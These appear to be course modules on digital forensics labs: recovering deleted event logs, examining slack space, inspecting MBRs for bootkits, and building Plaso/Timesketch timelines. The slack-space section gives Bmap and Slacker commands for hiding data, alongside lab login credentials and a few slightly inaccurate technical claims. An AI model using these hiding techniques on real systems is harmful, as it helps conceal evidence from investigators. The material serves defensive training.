Recovering Deleted Event Logs
This lab is focused on recovering the five event logs that were identified as deleted in the previous lab. It also covers analyzing those event logs to understand the activity that took place on the forensic image that is being investigated.

﻿

Workflow
﻿

1. Log in to the win-hunt VM using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Load the winserv.001 image located on the E:\ drive into FTK Imager.

﻿

The administrator account is the focus. His SID is S-1-5-21-3227957547-616921804-3487276839-500. All deleted event logs end up in that user account Recycle Bin.

﻿

3. Expand the directory tree down to winserv.001/Partition 2/Windows [NTFS]/[root]/$Recycle.Bin/S-1-5-21-3227957547-616921804-3487276839-500. 

﻿

4. Extract the six files listed below by holding CTRL and selecting each.

$RJWWJQK.evtx 131,076 (Security)

$R513JPG.evtx 1,028   (WMI-Activity)

$RYT30BW.evtx 8,260  (Task Scheduler)

$RA714GE.evtx 5,188   (Sysmon)

$RQXN6M8.evtx 15,364  (Powershell)

$R2DJFWL.evtx 14,404  (System)

﻿

The original filenames can be found within FTK by selecting the filename and viewing the hex content in the viewer below the filename.

﻿![image](https://github.com/user-attachments/assets/88675f7a-76f7-413c-84cc-03a46c0072d5)

5. Right-click and choose Export. Save the files to the desktop.


6. Open Event Viewer from the Windows icon by entering Event Viewer and selecting Event Viewer.

![image](https://github.com/user-attachments/assets/960629a0-66f2-4472-b8b1-7a9b0f7c4b73)

7. Select Action > Open Saved Log and add each exported log.


![image](https://github.com/user-attachments/assets/a5ef6db5-6fa4-4850-ac2e-ade55f24eeca)

NOTE: While outside the lab scope, it is worth noting that during an investigation of the event logs, an external tool such as Chainsaw or EvtxECmd is typically used rather than trying to open and search each event log individually.


8. Select $RJWWJQK.evtx. Select Action > Filter Current Log. In the new window, select Logged and Custom Range. In both the From and To drop-down menus, select Events On and choose the dates and times as shown in Figure 16.3-28.

![image](https://github.com/user-attachments/assets/a02575b0-29f7-4a1d-9f75-32c931eab5d2)



9. Open the log $RJWWJQK.evtx (Security.evtx), which shows users that recently attempted to log in to the system. Searching for the recent users on the system is the first thread to pull to know where to look next for additional details. Look for suspicious activity such as a few sequential failed logins followed by a successful one. The successful login provides a timestamp used as a reference point for the events that took place afterward. The event IDs for this type of activity are 4624 and 4625.


NOTE: Ignore the logins from the user trainee as this account is not associated with malicious behavior.


10. Select Action > Filter Current Log. There is a textbox that contains <All Event IDs>. Replace the text with the following and select OK to close the window:
4624,4625



11. Locate the two events where the usernames defaultuser and bob have failed logins followed by a successful login by the administrator account. This is typical of a password spraying attempt followed by the actor eventually finding a successful username/password combination. Focus on the time range of May 26, 2022 from 16:09:21 to 16:17:30.


The next step focuses on investigating suspicious activity that occurred once the actor obtained access to the host.


12. Investigate the following logs and event IDs:


$R2DJFWL.evtx log (System.evtx) and event ID 7045: Indicates a new service was created.


$RA714GE.evtx (Sysmon.evtx) and event ID 11: Indicates a new file being created.


$RYT30BW.evtx (Microsoft-Windows-TaskScheduler%4Operational.evtx) and event ID 129: Indicates a new task being created/registered


$RQXN6M8.evtx (Microsoft-Windows-PowerShell%4Operational.evtx) and event ID 24577: Indicates that a PowerShell script was executed from within the Integrated Scripting Engine (ISE) editor.


$R513JPG.evtx (Microsoft-Windows-WMI-Activity%4Operational.evtx) and event ID 5861: Indicates recent WMI subscriptions.


![image](https://github.com/user-attachments/assets/8419ecfc-d4a1-49d8-8cf0-a17548044e27)


-------------

### CDAH-M17L1-Analyzing Slack Space ###


Introduction to Slack Space
File Systems
﻿

Storage devices such as hard drives that are formatted with New Technology File System (NTFS) for Windows devices or fourth extended filesystem (ext4) for Linux devices, have clusters also known as blocks. Clusters are the smallest item on a disk that contains contiguous sectors that can be allocated to store files.

![image](https://github.com/user-attachments/assets/6ba7d58f-1403-4b09-ba30-5a96227e4872)

The default size of each cluster within these file systems is 4096 bytes (B) or 4 kilobytes (KB). One kilobyte is equal to 1000 bytes in the decimal number system according to the International System of Units (SI). In computing, however, kilobytes use the binary number system instead of decimal. Kilobytes are referred to as kibibytes in binary and are 1024 bytes in size. This is important because the block sizes are all measured in binary format, but almost all public documentation regarding disk space refers to kilobytes instead of kibibytes where a kilobyte is 1000 bytes and a kibibyte is 1024 bytes. A way to think of it is that kilobytes are the logical size, and the kibibyte of 1024 bytes is the physical size on the disk. The table below shows the values of disk sizes and the comparison between the decimal and binary numbering systems.


![image](https://github.com/user-attachments/assets/8daf07c2-1854-4677-bf39-b8014a0aac55)


The cluster size varies depending on the size of the hard drive. For example, as shown in the table below regarding NTFS, the cluster size increases depending on the hard disk size. The table below illustrates the cluster size relative to the volume/disk size. Each file that is written to disk uses the available 4096B (4KB * 1024) to store its data and runs over into another 4096B block if there isn’t enough space in the first block to hold the entire file.


Each file written to disk is assigned an index node (inode) number that is tracked by the file system. The files are stored within blocks/clusters that are also numbered, which enables the file system to quickly locate where the file is on the disk to be able to quickly access the file when it is in use. For example, the block that holds a file could be numbered as 2049, but the inode of a file stored on the block could be 12. They are just numbers used by the filesystem to locate and read the files and have nothing to do with file size. This is demonstrated later in the labs using the tool Autopsy.

![image](https://github.com/user-attachments/assets/d229fb46-f2bd-4be5-9349-4d49f639ecac)


Solid State Drives (SSD) and Hard Disk Drives (HDD) each approach handling slack space differently. SSDs perform wear leveling, as well as garbage collection using a command known as TRIM. These actions are automatically performed by the SSD controller and do not require a manual process started by a user.


The purpose of wear leveling is to ensure that data is written across a disk evenly as opposed to being written in the same set of blocks, which could cause those sections of the disk to wear out and lead the disk to fail. TRIM is used to clean up deleted files by overwriting them to allow for quicker access the next time a file needs to be written to disk. Traditionally on an HDD that does not have TRIM, the area where a new file is to be written needs to be overwritten first, which may not seem like much, but which takes time. SSDs have optimized the action, which leads them to be faster than HDDs. Since SSDs are always performing these actions as they read, write and delete files, they are overwriting and removing slack space from the disk. It is unlikely that the slack space of a file on an SSD would be there for a long time before it would be overwritten. The takeaway is that if an SSD is the source of an investigation, there probably is not any slack space to investigate, but if the image is from an HDD, there is potentially some slack space available.


Slack Space


Disks have three types of space:
Unallocated
Allocated
Slack


Unallocated space is also known as free space. When a file is deleted from the file system, the space becomes unallocated. Allocated space is space that is being used by files on the disk. Slack space is any space that has been allocated due to the size of a cluster, but is not being used by the file that precedes it. If a file is smaller than the size of a cluster, then a section of unused space exists on the disk between the end of the file data and the end of its clusters. For instance, if a text document stored in /home/trainee/file.txt is 7.5KB in size, it takes up 7680B across two blocks and leaves room for 512B of available slack space. The math here is that 7.5KB * 1024 = 7680B and two blocks is 4096B * 2 = 8192B. Subtracting 7680B from 8192B returns 512B of slack space. Figure 17.1-2 illustrates slack space.



![image](https://github.com/user-attachments/assets/abcbe099-b399-4761-be3e-4079f5b6aeb0)


Slack space can contain chunks of previously deleted files that haven’t been overwritten yet or can contain data purposefully hidden there. If a file grows in size or is securely deleted, then the data stored in slack space is overwritten and is no longer accessible. Therefore, slack space is not a reliable place to store information. 


Tools for Reading/Writing Slack Space


Autopsy


Autopsy provides a view of slack space within a forensic image. The Windows version of Autopsy displays all areas of a forensic image that contain slack space by prefacing filenames with -slack. This is an option that needs to be enabled. The Linux version of Autopsy does not have this option, but the hex editor view of a forensic image can see the slack space contents of files. The image below shows an example of Autopsy on Windows and how it labels and identifies files that have slack space.

![image](https://github.com/user-attachments/assets/8b3d94f2-ccc6-4254-af9d-df9eac1a73d8)


Blkls


The command blkls stands for “block list” and is part of The Sleuth Kit (TSK) and can dump the strings of all allocated, unallocated and slack space data found in a forensic image. It is useful for discovering if there is any data hidden in slack space and can then be used in combination with Autopsy by performing a keyword search to find out which file is closest to the slack space.


The command line for reading the contents of slack space with blkls:
blkls -s diskimage.dd



Bmap


Bmap is a Linux tool for reading and writing to and from slack space. The tool was written in 2000, but a variant of it is available on GitHub. This is the type of tool that an attacker would use to hide data within slack space. An example command in Linux to store data in slack space is shown below:
echo "data to be hidden in slack space" |bmap --putslack filename.txt



Slacker


Slacker is an open-source tool available on GitHub and allows for writing and reading from slack space on both Windows and Linux.


Syntax of slacker.exe syntax in Windows:
Slacker.exe -s [file containing data to hide] [filename with available slack space]



Syntax of slacker.sh in Linux:
sudo ./slacker.sh embed [filename with available slack space] [data]



Python


Python can perform both reading and writing of slack space. It is not as easy as Slacker. To be able to use Python, a lot of work has to be done on identifying which file is going to be used, determining the inode of that file and the amount of space that is free at the end of the file. Once all of that is sorted out, it uses the seek, read, and write commands to make changes to the filesystem.

![image](https://github.com/user-attachments/assets/51edd2f5-6d50-4807-9f62-0b9c8bc445a7)


------------

Viewing Slack Data
This lab below demonstrates the process of adding a forensic image into Autopsy and shows how to view slack space within the tool.

﻿

Workflow
﻿

1. Log in to the ubuntu20 VM.

Username: trainee
Password: CyberTraining1!
﻿


2. Open a terminal.

﻿

3.  To start Autopsy, run the following command and enter the trainee password when prompted:

sudo autopsy
﻿

4. Open Autopsy by right-clicking on the Uniform Resource Locator (URL) link and selecting Open Link, as shown in the image below:


![image](https://github.com/user-attachments/assets/3596b605-3df7-4452-a1a6-68841fb480d4)




5. Add a forensic image to analyze in Autopsy by selecting New Case


![image](https://github.com/user-attachments/assets/4a34f370-090a-4d7f-9488-105cd5c987e1)


6. Enter the case name slackspace-analysis and select New Case.

![image](https://github.com/user-attachments/assets/e517a7f8-8ac0-472b-9ff7-f2504a2483cb)

The image being analyzed needs to be named and added to the case. Usually, this would be the host name of a system.


7. Select Add Host to continue

![image](https://github.com/user-attachments/assets/d87635d7-9d02-473a-9c50-11c1240d6d1b)

8. Keep the default selections and select Add Host


![image](https://github.com/user-attachments/assets/b144ec47-866c-4c29-98bf-9fe7f0371496)

9. Select Add Image to continue.


![image](https://github.com/user-attachments/assets/b0a9ad2f-23f9-4a80-be9b-9239919265d3)


10. Select Add Image File.

![image](https://github.com/user-attachments/assets/b90143cf-fb33-4596-9017-4cad43a823a6)

11. In the window Add a New Image, use the following values, and select Next:

Location: /home/trainee/Desktop/suspicious-mod.dd.sda1

Type: Partition

Import Method: Symlink


![image](https://github.com/user-attachments/assets/8e1f26d0-c58d-4051-bc55-807ac593f34d)


12. In the next window, use the default settings and select Add.


![image](https://github.com/user-attachments/assets/61300600-bd86-410f-91bb-04021cd837c5)

13. The screen below shows an image that was loaded successfully. Select OK to continue.


![image](https://github.com/user-attachments/assets/8cf741fc-6c5a-44d6-98a0-b2db80c4c4ad)


14. To view the contents of the image file, select Analyze, as shown below:


![image](https://github.com/user-attachments/assets/9fe11aa0-4612-4d86-adf3-a4775985e1f2)


15. Select File Analysis.


![image](https://github.com/user-attachments/assets/d94b2fa5-ef19-4488-84d6-8e9cbd5fcc2c)

In this view, all the files that are present in the image can be accessed by selecting their filename.


16. Select the file named suspicious-file.txt. In the bottom pane, the contents of the file are displayed.



![image](https://github.com/user-attachments/assets/5ce58ab2-a57f-4052-ba38-8cca64ee4aa7)


17. To view the slack space contents that are not being displayed, select inode 12 on the far right (same line as suspicious-file.txt).


18. Scroll down and select block 2049 to view the raw content hidden in the available space after the file.



![image](https://github.com/user-attachments/assets/3f49bc50-dcc9-459d-b094-44064fe47620)


![image](https://github.com/user-attachments/assets/4624e35f-9fa3-4153-b231-7eced8116e6d)


![image](https://github.com/user-attachments/assets/221896ef-aa8b-4151-9a69-d0a3ac66dcd1)

---------------

Searching Through Slack Space
This second lab focuses on using Autopsy’s keyword search tool to determine where in a forensic image the already identified slack space is located so that it can later on be exported.

﻿

Workflow
﻿

1. Log in to the ubuntu20 VM with the following credentials, if necessary.

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal and change directory to the trainee desktop:

cd ~/Desktop
﻿

3. Enter the following command to view all items in slack space using blkls:

blkls -s suspicious-mod.dd.sda1
﻿

Part of the output from step 3 will be used in step 5, below. 

﻿

4. Return to the Autopsy window that was opened in the previous lab and select Keyword Search at the top.


﻿

5. In the search field, enter any set of characters from the output in step 3, for example "h.i.d.d.e.n," then select Search.

﻿

6. Select Ascii and review the result in the right pane, as indicated in the image below:



![image](https://github.com/user-attachments/assets/3b178b46-7bf5-4ed8-b9fe-49f6dd007527)


![image](https://github.com/user-attachments/assets/02a0915d-df84-4c50-9865-feb441f4e1d2)


----------

Exporting Slack Space Content
This lab demonstrates how to export data that has been identified as residing in slack space.

﻿

Workflow
﻿

1. Log in to the ubuntu20 VM with the following credentials, if necessary.

Username: trainee
Password: CyberTraining1!
﻿

2. Return to the Autopsy window that was opened in the previous lab and select File Analysis from the menu at the top.

﻿

3. Open the item that has slack space by selecting 12 on the far right under the Meta column.

﻿

4. Scroll to the bottom and select 2049.

﻿

5. Select Export Contents and make a note of the filename, as shown in the image below:



![image](https://github.com/user-attachments/assets/e1ecf9ea-971e-40d3-bca0-c33c4bd2d071)


6. In a terminal window, read the file that was just downloaded to see that the contents of slack space were exported successfully:
cat /home/trainee/Downloads/vol1-Fragment2049.raw


![image](https://github.com/user-attachments/assets/f365cea0-38b4-4e19-a287-e1127ccd1b71)

-------------------

### CDAH-M17L2-Bootkits ###

MBR Fundamentals
The Boot Process
﻿

Figure 17.2-1 illustrates the generic boot process. This process starts with the Basic Input/Output System (BIOS) loading the MBR during the PC boot. The master boot code locates the active partition of the drive. This partition is known as either the Volume Boot Record (VBR) or the first stage bootloader. The active partition then activates the second stage bootloader and runs the respective bootloader for the installed Operating System (OS) kernel. 

﻿

![image](https://github.com/user-attachments/assets/e79e669a-b082-4e18-a43c-c7ca8dc3ad0b)


Common bootloaders for the various operating systems are listed in Table 17.2-1, below:



![image](https://github.com/user-attachments/assets/4159b60f-c676-4592-8486-8e0c250abcca)

Unified Extensible Firmware Interface (UEFI)


This lesson focuses on the traditional BIOS/MBR boot process described above. However, another option, UEFI, offers better security in modern systems, so it is worth introducing briefly. 


UEFI is a modern mechanism for preventing unauthorized code from executing prior to the boot process. The primary component is the GUID Partition Table (GPT), which replaces the MBR in the boot process. The GPT is responsible for validating the firmware prior to executing the bootloader. If a bootkit is successful in bypassing the firmware validation, the security mechanisms provided by UEFI are rendered useless.


Even with UEFI available, modern computers still support the traditional boot process. The rest of this lesson focuses on the older MBR format for the traditional process. 


The MBR Layout


The MBR is the section of the hard disk that contains the location of the bootloader for the primary OS. Figure 17.2-2, below, illustrates the layout of the MBR, which comprises the following sections:
Master Boot Code (MBC): Contains the first 446 bytes of the MBR (starting with 0). This section locates the OS bootloader within the disk partition table. 
Disk Partition Table: Contains four partitions that each contain 16 bytes, for a total of 64 bytes in the table. Each functioning partition table ends with 0x55AA.
Signature: Contains the "magic number" that indicates that the MBR checksum is valid. This must provide a value of 0x55AA. Any other value indicates the MBR may be corrupt, infected by malware, or unbootable.



![image](https://github.com/user-attachments/assets/60052ace-6c3c-466e-a6a5-fb633a8f9246)


Partition Table Analysis


The partition table starts at byte offset 446 (0x1BE) and continues until byte offset 510 (0x1FE). The partition table entry contains information about the partition boot status, format, its physical location on the drive, and its size. Table 17.2-2, below, displays the byte values of the partition table entries.


![image](https://github.com/user-attachments/assets/c57cd162-c0e9-4f1e-9160-516a59f5ab34)


Methods of MBR Analysis


The information presented above in Table 17.2-2 can be collected and analyzed using a variety of tools, both command line and graphical. On Linux, command line tools such as strings or xxd extract human-readable data from the forensic disk image to include the MBR. The human-readable output of these tools allows a trained analyst to conduct a visual inspection of the data. On Windows, graphical applications such as Autopsy or the Forensic Tool Kit (FTK) analyze a disk image and MBR. These tools provide the most effective methods, but any application that displays the contents of a forensic disk image is also sufficient.


![image](https://github.com/user-attachments/assets/090f5b2e-5c64-4262-8673-d7e40c52222d)

![image](https://github.com/user-attachments/assets/9a61c438-6b9c-4071-8737-334e258d0c21)

![image](https://github.com/user-attachments/assets/2db27a0a-801d-4486-a0bb-7985092e1469)


--------------------



Analyzing Local Disk MBR
Bootkits
﻿

A bootkit is a bootable type of malware that modifies the standard boot process. The common goal for most bootkits is to bypass OS signature validation so that other malware can be installed without bringing attention to the user. Bootkits work below the operating system layer by infecting the Master Boot Record (MBR) or Globally Unique Identifier Partition Table (GPT). Installation typically involves overwriting the portion of the boot code responsible for executing the OS bootloader.

﻿

Bootkits are a type of rootkit. A rootkit is any malware that modifies a running OS. An example of a rootkit modification is hiding network connections and processes. Rootkits may also create hidden directories and entire file systems. Detecting a bootkit is significantly more difficult than detecting a rootkit infection. As an example, when performing dynamic analysis of a bootkit, the PC may not boot at all. Static analysis allows analysts to view the MBR using tools such as FTK Imager on Windows, or by using the Linux utility dd to carve out the MBR for inspection.

﻿

The MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework identifies bootkits as a pre-OS boot technique with technique ID T1542.003. 

﻿

Analyze a Local Disk MBR
﻿

Load disk images for MBR analysis and pull out various information about the MBR. Observe features of an uninfected MBR.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Start the application FTK Imager by selecting it from the Windows Start menu.

﻿

3. Load the local disk image by selecting Add All Attached Devices in the File menu.

﻿

FTK Imager loads the physical drive and any logical drives that it detects. 

﻿

4. Load the bottom right pane with the hex dump of the disk image selected by selecting the drive \\.\PHYSICALDRIVE0 from the Evidence Tree pane.

﻿

Figure 17.2-4, below, displays the ASCII hex dump of the MBR.



![image](https://github.com/user-attachments/assets/9f11d6cb-d283-4dd6-8cf0-aac04732ebd2)

![image](https://github.com/user-attachments/assets/55b1e546-b887-4ee9-8f34-e45cf81c9d73)


------------------

Analyze Disk Image MBR
In most cases, an analyst conducting a forensic investigation may uncover a bootkit unintentionally, while analyzing an image with another type of malware, such as ransomware. While it is difficult to definitively claim there is a bootkit in the following lab, it is still worthwhile to identify the differences between the forensic disk image and a clean MBR. For bootkit detections, the more experience an analyst has with viewing MBRs, the more familiar they will be with identifying entries that are out of the ordinary.

﻿

﻿

Analyze the MBR of a Disk Image
﻿

Load a forensic disk image that contains a bootkit. Compare features of the bootkit-infected MBR with the clean MBR from the previous lab. Continue working in the VM win-hunt to complete the following lab. 

﻿

Workflow
﻿

1. Open a second instance of FTK Imager from the Windows Start menu.﻿﻿

﻿

2. Add the image bootkit.bin as an evidence item by navigating to File and selecting Add Evidence Item…﻿

﻿

3. In the window Select Source, select Image File, then select Next. 

﻿

4. On the page Select File, select Browse, then select the file bootkit.bin on the desktop at the path C:\Users|trainee\Desktop\bootkit.bin﻿

﻿

5. Load the bootkit image into the Evidence Tree by selecting Finish.

﻿

The boot code section of the local disk image from the previous lab and the infected disk image from this lab have different sizes. The boot code section of the local disk image stops at offset 0x1BD with no padding. Although the infected disk image also stops at offset 0x1BD, it has 58 bytes of 0x00 padding to ensure that the MBR checksum remains valid. Figure 17.2-5, below, displays the values of offset 0x1FE and 0x1FF.


![image](https://github.com/user-attachments/assets/4cc660ea-5bd9-4301-af7f-f7d54ee13764)


![image](https://github.com/user-attachments/assets/446ac8b7-4d6b-4f35-a6b3-f11912b55dfa)

-------------

More Bootkit Detection Methods
FTK is a great tool for analyzing disk images, but an analyst should not limit themselves to only one capability. Many different tools are also available to effectively discover information from forensic disk images. The following labs introduce two additional options. The first option uses the Linux command line while the second option uses the Windows application Autopsy.

﻿

Analyze with Linux Command Line
﻿

Use the Linux command line to analyze a disk image. 

﻿

﻿
Workflow
﻿

1. Log in to the VM sift using the following credentials:

Username: sansforensics
Password: forensics
﻿

2. Open a terminal window and change the directory to the desktop by entering the following command:

cd Desktop
﻿

3. Use the command xxd to dump the hex values from bootkit.bin to the terminal screen by entering the following command:

xxd bootkit.bin
﻿

﻿

Detect with Autopsy
﻿

Use the tool Autopsy to detect a bootkit. 

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Start the application Autopsy 4.19.3 by selecting it from the Windows Start menu.

﻿

3. Create a new case by selecting New Case in the Welcome window.

﻿

4. Define the case settings as follows:

Case Name: Bootkit-Lab
Base Directory: (leave default)
5. Select Next and enter the following information in their respective fields:

Case Number: 12345
Examiner Name: trainee
6. Initialize the database by selecting Finish.

﻿

The dialog window Add Data Source opens after the database finishes initializing.

﻿

7. Select Next in the dialog window and leave the default values as they are.

﻿

8. Select Disk Image or VM File, then select Next.

﻿

9. Use the Browse field to navigate to and select the file bootkit.bin from the Desktop, then select Next.

﻿

10. Select Next and leave the default values as they are.

﻿

NOTE: Autopsy displays an error message after this step. This is expected.

﻿

11. Select Finish to view the new case Bootkit-Lab.

﻿

12. In the Listing pane, double-click bootkit.bin_1 Host, then select the image bootkit.bin. 

﻿

This presents the hex dump in the bottom pane, as displayed in Figure 17.2-6, below:



![image](https://github.com/user-attachments/assets/795935a5-a32f-44c6-af83-a547d8abf47f)


![image](https://github.com/user-attachments/assets/90bfbbda-51f8-4134-a0be-defaf095fee8)


--------------

### CDAH-M17L3-Building a Timeline ###


Timeline Overview
A timeline is a list of events that occurred on a system and the times that they occurred. During a forensic examination, a timeline can be the most valuable tool available to an analyst due to the number of files involved and their organization within the forensic image. A forensic image may comprise thousands of files. In addition, Operating Systems (OS) do not store data in a structure well organized by date; instead, folders and files are nested within other folders. A timeline is helpful when a particular date or time is known or suspected to be associated with malicious activity, as it can filter an entire forensic image to just a few events based on the time range of interest. This greatly reduces the time required for analysis. For example, if 2022-01-01 12:00:00 is the determined date of suspicious activity, a timeline can show all files and events that were created, modified, or deleted at that time across the entire forensic image. Such a focus helps the analyst more efficiently determine the actions of the malicious actor.

﻿

Timeline Types
﻿

Two types of timelines are available during a forensic investigation:

Forensic timeline: A file that contains all dates and actions that occurred within an entire forensic image.
Analysis timeline: The cumulative result of analysis; it includes each important finding, to be used in a forensic report or to illustrate the process of events that occurred. 
﻿Table 17.3-1 provides an example of an analysis timeline:


![image](https://github.com/user-attachments/assets/b09e3f12-b1d9-4dfd-8348-497a69ca406e)

Tools for Creating Timelines
Manually creating a timeline can be quite time consuming, but tools are available that create timelines automatically with supplied parameters. Examples of such tools are Autopsy, KAPE, and Plaso. Plaso is the industry standard for creating forensic timelines, and, in fact, Autopsy and KAPE both require a Plaso plug-in that enables them to automatically create a timeline.

﻿

Autopsy
﻿

The forensic tool Autopsy is available for both Windows and Linux, but its functions differ between the two OSs. The Windows version of Autopsy creates a timeline as part of its ingestion and analysis whenever a forensic image is added into the tool; the Linux version does not. 

﻿

﻿

KAPE
﻿

The forensic tool KAPE runs only on Windows. It can create a timeline from a Windows host in fewer than 5 minutes when it is focused only on the Master File Table (MFT), registry files, and event logs.

﻿

﻿

Plaso
﻿

As stated earlier, Plaso, formerly called log2timeline, is the industry standard for creating timelines of forensic images. Plaso supports analysis of Windows, Linux, macOS, Android, and iOS forensic images. Plaso can parse many files that typically require additional tools to be read. For example, Plaso can read Windows Event Logs, registry files, databases, volume shadow copies, and MFTs. Plaso reads all these files; extracts the metadata of files, dates, and times of events that have occurred; places the output into a .plaso file; and creates a Comma-Separated Values (CSV) file. Plaso is installed on the SIFT Workstation, a collection of incident response and forensic tools, by default. 

﻿

Table 17.3-2 provides descriptions of Plaso’s three main command-line tools, pinfo.py, psteal.py, and psort.py:



![image](https://github.com/user-attachments/assets/adeb7fb1-22ec-422a-96cc-4b73a28ddae4)


The following command creates a timeline from Plaso:
psteal.py --source image.raw -o dynamic -w timeline.csv



The .plaso file is a Structured Query Language (SQL) database that contains more details than the resulting CSV file and, like the CSV file, can be loaded into other tools, including Timesketch, Splunk, Elastic, or any queryable tool, for analysis. However, because the .plaso file is generally larger than the CSV file and may require an hour or more to be indexed (depending on its size), the recommendation is to ingest the CSV file instead. 


Even though CSV files are typically smaller than their corresponding .plaso files, they are often too large to be opened by spreadsheet-processing software. For example, Microsoft Excel can read only about the first 20,000 lines of a 3-Gigabyte (GB) CSV timeline file. Timesketch is the most common tool used for timeline analysis, as it is built strictly for this purpose. Other solutions are to use Eric Zimmerman’s EZViewer tool or Timeline Explorer in Windows or to use the command line to grep through and filter the file in Linux.


Timesketch


Timesketch has seven main parameters on which data can be filtered: Datetime (UTC), message, display_name, parser, source, timestamp_desc, and Timeline name.


![image](https://github.com/user-attachments/assets/9112ab82-af34-4298-a133-801de9af7d39)




Timesketch uses Elasticsearch and allows for queries to quickly filter through the data. Examples of such queries are as follows:
To see all events, enter an asterisk (*) in the search box.
To find all registry events, enter source:REG in the search box.
To find all events that mention the name of a file, enter "filename.txt" in the search box.
To filter out such events as modification times and view a timestamp of a specific type and with a specific event log Identifier (ID), enter timestamp_desc:Creation "4625" in the search box (where the example timestamp type is Creation and example event log ID is 4625).
Time Zones


By default, Plaso generates a timeline in Coordinated Universal Time (UTC), not in the time zone that was in use in the forensic image. The local time zone of the forensic image must be known before beginning analysis. When running Plaso, it is possible to specify in the command which time zone to output the results in. The following examples specify that the timeline’s CSV file should be written in the Eastern time zone.


To create the timeline with the time zone specified, run the following command: 
psteal.py --source image.raw --output-time_zone EST5EDT -o dynamic -w timeline.csv



When reading from a .plaso file in an already created timeline and to convert the timeline to a different time zone and write to a new CSV file, run the following command:
psort.py --output-time_zone EST5EDT timeline.plaso -w timeline.csv



Adding Efficiency


If only a few files or artifacts are of interest in a forensic image, Plaso can be provided with those filenames instead of the whole forensic image, resulting in a much smaller .plaso file and, therefore, more rapid processing times. If, instead, the entire forensic image must have a timeline generated for it but a select date range is known to contain items of interest, the timeline can be minimized for faster analysis.


A timeline can be filtered by the following command. The UTC time must be specified, even if the .plaso file is generated with a different time zone.
psort.py -q filename.plaso "date > '2022-05-26 20:09:00' and date < '2022-05-26 20:18:00'" -w filtered.csv



This command extracts only the dates between those specified to greatly reduce the physical size of the timeline and to contain only events in that range. 


---------------------

Timeline Event Types
Timelines gather multiple files and event information. A timeline can include such actions as the following:

System events

System reboots

Crashes

Log rotations

Service restarts

Software installs

Network connections

System configuration modifications

User activity events

Logon/logoff

Web browsing

File creation/deletion/modification times

Recent files


![image](https://github.com/user-attachments/assets/3bf3d61c-64a9-497b-bcc5-c9b93cffc92c)


---------------------



Create and Filter a Timeline
In the following lab series, create a forensic timeline using the provided Security.evtx file, filter the timeline, and view the results. A single Windows Event Log is used for time efficiency. The log focuses on 2022-05-26 16:09:00 through 2022-05-26 16:18:00 EST.

﻿

Complete the steps in the following workflow to create the timeline and filter it using a spreadsheet-processing application and the command-line tool grep. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) ubuntu20 using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a Terminal window, and run the following command to change to the directory where the Security.evtx file is located:

cd /home/trainee/Desktop/Lab1



![image](https://github.com/user-attachments/assets/5b5fceb3-e0c4-45e7-a948-163e62547398)

3. Run the following command to create a timeline from the Security.evtx file. This requires approximately 6 minutes.
psteal.py --source Security.evtx --output_time_zone EST5EDT -o dynamic -w security.csv



The result is a .plaso file:


![image](https://github.com/user-attachments/assets/8d508add-4032-480b-9b31-1ee2a742424e)


NOTE: The .plaso file is named according to the date and time the psteal.py command was run. Thus, the .plaso filename in Figure 17.3-2 is not the same as the filename generated during this workflow. 


4. Run the following command to verify creation of the new files and their sizes:
ls -alh




![image](https://github.com/user-attachments/assets/8b213783-e313-4f81-b64b-3a3b30f6a3ad)


Because the .plaso file is a database generated by Plaso that includes all the timeline information, it is much larger than the Security.evtx file. The security.csv file is even larger than the .plaso file, which is uncommon, but for ease of reading the contents, the best timeline file to use is the CSV file.


As stated earlier, using a spreadsheet application for timeline analysis of a CSV file can be difficult. To understand this more fully, open the CSV file in LibreOffice Calc, and attempt a search.


5. Run the following command to view the contents of the security.csv file in LibreOffice Calc. Ignore any errors in terminal and when LibreOffice Calc opens, select OK.
libreoffice.calc security.csv



![image](https://github.com/user-attachments/assets/3072e2ba-6882-4fd8-b8cc-93ae6e8bce09)

6. The security.csv file can be edited, sorted, and modified in LibreOffice Calc. Perform a search for 4625 (failed login attempts), and try to read the events linked to the results. Reading the events is challenging, as the rows are long, and the search term is found in other fields beyond the message field. 


7. Close the file, and return to the Terminal. 


8. Run the following commands to view the date/time range of events in the security.csv file:
head -n 2 security.csv
tail -n 2 security.csv



![image](https://github.com/user-attachments/assets/b9a149e8-3272-45ee-9a49-dc3bd694b50d)


9. The results of the previous command show that the date range in this timeline is 2022-03-27 through the day the timeline is created. (Figure 17.3-5 shows a different end date, as its timeline was created on 2022-07-05.)


10. Run the following command to create a smaller timeline that includes only the window of time during which the malicious activity occurred: 
psort.py -q (plaso file date)-Security.evtx.plaso "date > '2022-05-26 20:09:00' and date < '2022-05-26 20:18:00'" -w filteredsecurity.csv --output_time_zone EST5EDT



NOTE: The EST time window is 16:09 through 16:18, but, by default, Plaso ignores that the .plaso file was output in the EST timezone and reads it back in as UTC. If the times of 16:09 and 16:18 are used, no data is exported.


![image](https://github.com/user-attachments/assets/c60ca6f9-b5d0-4fba-b725-3fdb69ba2050)

11. Run the following command to filter the log for failed and successful logins during the new time window:

cat filteredsecurity.csv |egrep -v "'trainee'|ANONYMOUS|DC01\\$"|egrep "4624|4625"


![image](https://github.com/user-attachments/assets/059ad555-4001-439e-aae3-cc259cd324f8)


Six events are found: four for failed logins and two for successful logins. In this timeline view, it is difficult to determine why the same user had two failures when they attempted to log in only once. The reason is that Plaso shows both when the security log was last modified and when it was created. Another filter would need to be added to the grep to remove the creation logs.


As stated earlier, the tool Timesketch is built strictly for timeline analysis. Complete the steps in the following workflow to filter a timeline and view the results using Timesketch.


Workflow 


1. Open a Terminal, and run the following commands. Enter the trainee password CyberTraining1! when prompted.

cd /home/trainee/Desktop/


sudo ./StartTimesketch.sh


![image](https://github.com/user-attachments/assets/89dcd605-f4e1-459b-9754-4321d6b0fb99)

2. Open Firefox, and browse to localhost.


3. Log in to Timesketch with the following credentials:

Username: trainee
Password: CyberTraining1!




4. Select New Investigation, and name it securitylog.



5. Select filteredsecurity.csv as the file to upload to Timesketch:


![image](https://github.com/user-attachments/assets/d22d0c11-c91b-4de2-8e76-a309f6e6c133)


6. Once the Name fields are populated, select Upload:



